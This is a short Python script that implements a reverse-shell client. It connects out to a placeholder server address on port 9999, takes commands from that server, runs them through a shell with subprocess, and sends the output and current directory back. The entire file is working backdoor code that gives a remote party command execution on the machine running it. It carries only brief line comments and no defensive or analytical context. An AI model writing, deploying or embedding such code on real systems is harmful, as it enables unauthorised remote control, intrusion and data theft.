import socket
import os
import subprocess
s= socket.socket()
host= "<server Ip>"
port=9999
s.connect((host,port)) # it is used to establish a connection to specified host from client server

while True:
    try:
        data = s.recv(1024) # to receive the data from the server
        if data[:2].decode("utf-8")== 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) >0:
            cmd=subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str=str(output_byte,"utf-8")
            currentWD=os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))
            print(output_str)
    except:
        error_message = 'invalid command'
        s.send(str.encode(error_message))
